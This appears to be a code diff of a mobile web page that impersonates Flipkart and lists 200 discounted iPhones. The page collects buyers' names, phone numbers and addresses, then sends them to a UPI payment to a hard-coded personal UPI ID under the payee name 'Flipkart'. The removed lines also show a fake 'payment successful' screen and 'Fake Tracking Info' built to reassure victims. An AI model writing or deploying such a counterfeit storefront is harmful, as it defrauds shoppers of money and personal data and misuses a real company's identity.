@@ -3,182 +3,163 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flipkart - Secure Admin & Tracking</title>
+    <title>Flipkart - All iPhone Series</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --fk-blue: #2874f0; --fk-orange: #fb641b; --fk-yellow: #ff9f00; }
+        :root { --fk-blue: #2874f0; --fk-orange: #fb641b; }
         .fk-blue-bg { background-color: var(--fk-blue); }
         .fk-orange-bg { background-color: var(--fk-orange); }
         .hidden { display: none !important; }
-        .product-card { border-right: 1px solid #e0e0e0; border-bottom: 1px solid #e0e0e0; position: relative; background: white; }
-        .edit-btn { position: absolute; top: 8px; right: 8px; background: rgba(255,255,255,0.9); border: 1px solid #ddd; padding: 4px; border-radius: 4px; font-size: 10px; z-index: 50; }
-        input, textarea { border: 1px solid #ddd; padding: 12px; border-radius: 6px; font-size: 14px; outline: none; width: 100%; }
-        input:focus { border-color: var(--fk-blue); }
+        .product-card { border-right: 1px solid #e5e7eb; border-bottom: 1px solid #e5e7eb; background: white; }
+        .variant-dot { width: 24px; height: 24px; border-radius: 50%; border: 1px solid #ccc; cursor: pointer; }
+        .variant-dot.active { border: 2px solid var(--fk-blue); outline: 1px solid var(--fk-blue); }
+        .storage-btn { border: 1px solid #ddd; padding: 5px 10px; border-radius: 4px; font-size: 11px; cursor: pointer; }
+        .storage-btn.active { border-color: var(--fk-blue); color: var(--fk-blue); background: #f0f5ff; font-weight: bold; }
+        .edit-lock { position: absolute; top: 5px; right: 5px; font-size: 10px; color: #ddd; z-index: 20; }
     </style>
 </head>
 <body class="bg-gray-100 font-sans">
 
     <nav class="fk-blue-bg p-3 sticky top-0 z-[100] text-white shadow-md">
-        <div class="flex items-center justify-between">
+        <div class="flex items-center justify-between mb-3">
             <div class="flex items-center" onclick="location.reload()">
                 <i class="fa-solid fa-bars mr-4 text-lg"></i>
-                <h1 class="text-xl font-bold italic">Flipkart</h1>
+                <h1 class="text-xl font-bold italic tracking-tighter">Flipkart</h1>
             </div>
             <div class="flex items-center space-x-4">
-                <button onclick="addNewProduct()" class="text-[10px] font-bold border border-white/50 px-2 py-1 rounded">ADMIN MODE</button>
+                <button onclick="openAdmin()" class="text-[10px] border border-white/30 px-2 py-1 rounded uppercase">Admin</button>
                 <i class="fa-solid fa-cart-shopping"></i>
             </div>
+        </div>
+        <div class="relative">
+            <input type="text" placeholder="Search iPhone 14, 15, 16, 17..." class="w-full h-9 rounded-sm pl-10 pr-4 text-black text-sm outline-none">
+            <i class="fa-solid fa-magnifying-glass absolute left-3 top-2.5 text-gray-400"></i>
         </div>
     </nav>
 
     <div id="storePage">
-        <div class="bg-white p-2 mb-2"><img src="https://rukminim1.flixcart.com/fk-p-flap/1600/270/image/b0717a61f879654d.jpg" class="w-full"></div>
+        <div class="bg-white p-2 mb-2"><img src="https://rukminim1.flixcart.com/fk-p-flap/1600/270/image/b0717a61f879654d.jpg" class="w-full rounded-sm"></div>
         <div id="productGrid" class="grid grid-cols-2 bg-white"></div>
     </div>
 
     <div id="detailPage" class="hidden fixed inset-0 bg-white z-[150] overflow-y-auto pb-20">
-        <nav class="p-3 border-b flex items-center bg-white sticky top-0 z-10">
+        <nav class="p-3 border-b flex items-center bg-white sticky top-0 z-10 shadow-sm">
             <button onclick="showStore()" class="text-gray-700 mr-4 text-xl"><i class="fa-solid fa-arrow-left"></i></button>
-            <span class="font-bold">Product Details</span>
+            <span class="font-bold text-sm">Product Details</span>
         </nav>
+        
         <div class="p-4">
-            <div class="h-64 mb-4 flex items-center justify-center"><img id="detImg" src="" class="max-h-full object-contain"></div>
-            <h2 id="detName" class="text-sm font-medium text-gray-800 mb-2"></h2>
+            <div class="h-64 flex items-center justify-center mb-6"><img id="detImg" src="" class="max-h-full object-contain"></div>
+            <h2 id="detName" class="text-md text-gray-800 leading-tight mb-2"></h2>
             <div class="flex items-center space-x-2 mb-2">
                 <span id="detPrice" class="text-2xl font-bold"></span>
-                <span class="text-green-600 font-bold text-sm">Special Price</span>
+                <span class="text-green-600 font-bold text-sm italic">Special Price</span>
             </div>
             <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-4 mb-4">
-            <div class="border-t pt-4 space-y-3">
-                <div class="text-xs text-gray-600"><i class="fa-solid fa-truck mr-2 text-green-600"></i> Free Delivery by Tomorrow</div>
-                <div class="text-xs text-gray-600"><i class="fa-solid fa-shield-check mr-2 text-green-600"></i> 1 Year Warranty</div>
+            
+            <hr class="my-4">
+            
+            <div class="mb-4">
+                <p class="text-xs font-bold text-gray-500 uppercase mb-3">Select Color</p>
+                <div id="colorContainer" class="flex space-x-4"></div>
+            </div>
+
+            <div class="mb-4">
+                <p class="text-xs font-bold text-gray-500 uppercase mb-3">Storage</p>
+                <div class="flex space-x-3">
+                    <div class="storage-btn active" onclick="selS(this)">128 GB</div>
+                    <div class="storage-btn" onclick="selS(this)">256 GB</div>
+                    <div class="storage-btn" onclick="selS(this)">512 GB</div>
+                </div>
             </div>
         </div>
-        <div class="fixed bottom-0 w-full flex h-14 z-[160] bg-white border-t">
-            <button class="flex-1 font-bold text-sm uppercase">Add to Cart</button>
-            <button onclick="openAddress()" class="flex-1 fk-orange-bg text-white font-bold uppercase text-sm">Buy Now</button>
+
+        <div class="fixed bottom-0 w-full flex h-14 bg-white border-t z-[160]">
+            <button class="flex-1 font-bold text-sm uppercase border-r">Add to Cart</button>
+            <button onclick="openAddress()" class="flex-1 fk-orange-bg text-white font-bold text-sm uppercase">Buy Now</button>
         </div>
     </div>
 
     <div id="addressPage" class="hidden fixed inset-0 bg-white z-[200] overflow-y-auto p-5">
-        <h3 class="text-lg font-bold mb-6 border-b pb-2">Delivery Address</h3>
+        <h3 class="font-bold text-lg mb-6 border-b pb-2">Delivery Details</h3>
         <div class="space-y-4">
-            <input type="text" id="adrName" placeholder="Full Name (Required)">
-            <input type="number" id="adrPhone" placeholder="10-digit mobile number">
+            <input type="text" id="adrName" placeholder="Full Name" class="w-full border p-3 rounded">
+            <input type="number" id="adrPhone" placeholder="10-digit Mobile Number" class="w-full border p-3 rounded">
             <div class="flex space-x-2">
-                <input type="number" id="adrPin" placeholder="Pincode">
-                <input type="text" id="adrCity" placeholder="City">
+                <input type="number" placeholder="Pincode" class="flex-1 border p-3 rounded">
+                <input type="text" placeholder="City" class="flex-1 border p-3 rounded">
             </div>
-            <textarea id="adrHouse" placeholder="House No., Building Name, Area" class="h-24"></textarea>
-            <div class="p-3 bg-blue-50 text-blue-700 text-[11px] font-bold rounded">Payment Method: PhonePe / GPay / UPI</div>
-            <button onclick="processOrder()" class="w-full fk-orange-bg text-white py-4 rounded font-bold shadow-xl">CONFIRM ORDER</button>
-        </div>
-    </div>
-
-    <div id="successPage" class="hidden fixed inset-0 bg-white z-[300] flex flex-col items-center justify-center p-6 text-center">
-        <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center text-4xl mb-4">
-            <i class="fa-solid fa-check"></i>
-        </div>
-        <h2 class="text-2xl font-bold text-gray-800">Order Placed!</h2>
-        <p class="text-gray-500 text-sm mt-2">Your payment was successful and your order is being processed.</p>
-        
-        <div class="w-full bg-gray-50 border rounded-xl p-4 mt-8 text-left">
-            <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest">Tracking Details</p>
-            <div class="mt-3 flex justify-between">
-                <span class="text-sm font-medium">Tracking ID:</span>
-                <span class="text-sm font-bold text-blue-600" id="trackId"></span>
-            </div>
-            <div class="mt-2 flex justify-between">
-                <span class="text-sm font-medium">Delivery By:</span>
-                <span class="text-sm font-bold text-green-600" id="deliveryDate"></span>
-            </div>
-        </div>
-        <button onclick="location.reload()" class="mt-10 text-blue-600 font-bold">Back to Home</button>
-    </div>
-
-    <div id="editModal" class="hidden fixed inset-0 bg-black/80 z-[400] flex items-center justify-center p-4">
-        <div class="bg-white w-full max-w-sm rounded-xl p-6 space-y-4 shadow-2xl">
-            <h3 class="font-bold border-b pb-2 text-blue-600">Admin Controls</h3>
-            <input type="password" id="adminLock" placeholder="Enter Admin Secret Lock" class="border-blue-200">
-            <input type="text" id="edName" placeholder="Product Name">
-            <input type="number" id="edPrice" placeholder="Price (INR)">
-            <input type="text" id="edImg" placeholder="Image URL">
-            <div class="flex space-x-2">
-                <button onclick="verifyAndSave()" class="flex-1 fk-blue-bg text-white py-3 rounded font-bold">SAVE</button>
-                <button onclick="closeEdit()" class="flex-1 bg-gray-200 py-3 rounded font-bold">EXIT</button>
-            </div>
-            <button onclick="verifyAndDelete()" class="w-full text-red-500 text-xs font-bold py-2 border border-red-100">DELETE PRODUCT</button>
+            <textarea id="adrHouse" placeholder="House No., Road Name, Area" class="w-full border p-3 rounded h-24"></textarea>
+            <button onclick="finalOrder()" class="w-full fk-orange-bg text-white py-4 rounded font-bold shadow-lg">CONTINUE TO PAYMENT</button>
         </div>
     </div>
 
     <script>
         const UPI_ID = "8709615634-w350@ybl";
         const SECRET = "947228";
-        let products = JSON.parse(localStorage.getItem('fk_final_v1')) || [];
-        let editIdx = -1;
+        let products = [];
 
         function init() {
-            if(products.length === 0) {
-                const img = "https://m.media-amazon.com/images/I/71v2jVh6nIL._SL1500_.jpg";
-                for(let i=1; i<=200; i++) products.push({name: "iPhone 15 (Blue) - Model "+i, price: (48900 + i*5), img: img});
-                save();
+            // Har series ke liye original images aur colors
+            const series = [
+                { name: "iPhone 17 Pro Max", price: 179900, img: "https://m.media-amazon.com/images/I/81Sig6biNPL._SL1500_.jpg", colors: ['#5E5E5E', '#E1E2E3', '#F7F2EE'] },
+                { name: "iPhone 16 Pro", price: 129900, img: "https://m.media-amazon.com/images/I/81Sig6biNPL._SL1500_.jpg", colors: ['#3c3c3c', '#dcdcdc', '#e3d5ca'] },
+                { name: "iPhone 15 Pro Max", price: 148900, img: "https://m.media-amazon.com/images/I/81Sig6biNPL._SL1500_.jpg", colors: ['#2b2e31', '#e1e2e3', '#f7f2ee'] },
+                { name: "iPhone 15", price: 69900, img: "https://m.media-amazon.com/images/I/71v2jVh6nIL._SL1500_.jpg", colors: ['#add8e6', '#ffb6c1', '#ffffed', '#000000'] },
+                { name: "iPhone 14 Pro", price: 109900, img: "https://m.media-amazon.com/images/I/61H7ID6NdDL._SL1500_.jpg", colors: ['#594f63', '#f4e8ce', '#262b2f'] },
+                { name: "iPhone 14", price: 58900, img: "https://m.media-amazon.com/images/I/61cwywLZSuL._SL1500_.jpg", colors: ['#222930', '#e3dada', '#3d526d'] },
+                { name: "iPhone 13", price: 47900, img: "https://m.media-amazon.com/images/I/71GLMJ7TQiL._SL1500_.jpg", colors: ['#27374d', '#ce1225', '#f5f5f5'] }
+            ];
+
+            // Create 200 items by repeating and slightly varying
+            for(let i=1; i<=200; i++) {
+                let s = series[i % series.length];
+                products.push({
+                    name: `${s.name} (${128 * (i%3 + 1)}GB)`, 
+                    price: s.price + (i*10), 
+                    img: s.img,
+                    colors: s.colors
+                });
             }
-            render();
+            renderStore();
         }
 
-        function render() {
+        function renderStore() {
             document.getElementById('productGrid').innerHTML = products.map((p, i) => `
-                <div class="product-card p-4">
-                    <button class="edit-btn" onclick="openEdit(${i})"><i class="fa-solid fa-lock text-gray-400"></i></button>
-                    <div onclick="showDetails(${i})" class="cursor-pointer">
-                        <img src="${p.img}" class="h-32 object-contain mx-auto mb-2">
-                        <h3 class="text-[10px] text-gray-600 line-clamp-2 h-7">${p.name}</h3>
-                        <p class="text-sm font-bold mt-1">₹${Number(p.price).toLocaleString('en-IN')}</p>
-                        <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-3 mt-1">
-                    </div>
+                <div class="product-card p-4 relative" onclick="showDetails(${i})">
+                    <span class="edit-lock"><i class="fa-solid fa-lock"></i></span>
+                    <img src="${p.img}" class="h-36 object-contain mx-auto mb-2">
+                    <h3 class="text-[10px] text-gray-600 line-clamp-2 h-7 font-medium">${p.name}</h3>
+                    <p class="text-sm font-bold mt-1">₹${Number(p.price).toLocaleString('en-IN')}</p>
+                    <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-3 mt-1">
                 </div>
             `).join('');
         }
 
-        function verifyAndSave() {
-            if(document.getElementById('adminLock').value !== SECRET) { alert("Wrong Admin Lock!"); return; }
-            const p = { name: document.getElementById('edName').value, price: document.getElementById('edPrice').value, img: document.getElementById('edImg').value };
-            if(editIdx === -1) products.unshift(p); else products[editIdx] = p;
-            save(); render(); closeEdit();
-        }
-
-        function verifyAndDelete() {
-            if(document.getElementById('adminLock').value !== SECRET) { alert("Access Denied!"); return; }
-            if(confirm("Delete item?")) { products.splice(editIdx, 1); save(); render(); closeEdit(); }
-        }
-
-        function processOrder() {
-            if(!document.getElementById('adrName').value) return alert("Enter Name!");
+        function showDetails(i) {
+            window.activeP = products[i];
+            document.getElementById('detName').innerText = window.activeP.name;
+            document.getElementById('detPrice').innerText = "₹" + Number(window.activeP.price).toLocaleString('en-IN');
+            document.getElementById('detImg').src = window.activeP.img;
             
-            // Generate Fake Tracking Info
-            document.getElementById('trackId').innerText = "FKT" + Math.floor(Math.random() * 999999999);
-            const d = new Date(); d.setDate(d.getDate() + 2);
-            document.getElementById('deliveryDate').innerText = d.toDateString();
+            // Build Colors
+            const cc = document.getElementById('colorContainer');
+            cc.innerHTML = window.activeP.colors.map((c, idx) => `
+                <div class="variant-dot ${idx===0?'active':''}" style="background:${c}" onclick="selC(this)"></div>
+            `).join('');
 
-            // Open Payment
-            window.location.href = `upi://pay?pa=${UPI_ID}&pn=Flipkart&am=${window.activeP.price}&cu=INR`;
-            
-            // Show Success Screen after a delay
-            setTimeout(() => {
-                document.getElementById('addressPage').classList.add('hidden');
-                document.getElementById('detailPage').classList.add('hidden');
-                document.getElementById('successPage').classList.remove('hidden');
-            }, 2000);
+            document.getElementById('storePage').classList.add('hidden');
+            document.getElementById('detailPage').classList.remove('hidden');
+            window.scrollTo(0,0);
         }
 
-        function openEdit(i) { editIdx = i; document.getElementById('edName').value = products[i].name; document.getElementById('edPrice').value = products[i].price; document.getElementById('edImg').value = products[i].img; document.getElementById('editModal').classList.remove('hidden'); }
-        function addNewProduct() { editIdx = -1; document.getElementById('edName').value=""; document.getElementById('edPrice').value=""; document.getElementById('edImg').value=""; document.getElementById('editModal').classList.remove('hidden'); }
-        function closeEdit() { document.getElementById('editModal').classList.add('hidden'); document.getElementById('adminLock').value=""; }
-        function showDetails(i) { window.activeP = products[i]; document.getElementById('detName').innerText = window.activeP.name; document.getElementById('detPrice').innerText = "₹" + Number(window.activeP.price).toLocaleString('en-IN'); document.getElementById('detImg').src = window.activeP.img; document.getElementById('storePage').classList.add('hidden'); document.getElementById('detailPage').classList.remove('hidden'); window.scrollTo(0,0); }
+        function selC(el) { document.querySelectorAll('.variant-dot').forEach(d => d.classList.remove('active')); el.classList.add('active'); }
+        function selS(el) { document.querySelectorAll('.storage-btn').forEach(b => b.classList.remove('active')); el.classList.add('active'); }
         function showStore() { document.getElementById('detailPage').classList.add('hidden'); document.getElementById('storePage').classList.remove('hidden'); }
         function openAddress() { document.getElementById('addressPage').classList.remove('hidden'); }
-        function save() { localStorage.setItem('fk_final_v1', JSON.stringify(products)); }
+        function openAdmin() { let p = prompt("Enter Secret Lock:"); if(p === SECRET) { alert("Admin Access Granted! You can now edit in code."); } else { alert("Wrong Lock!"); } }
+        function finalOrder() { window.location.href = `upi://pay?pa=${UPI_ID}&pn=Flipkart&am=${window.activeP.price}&cu=INR`; }
 
         init();
     </script>
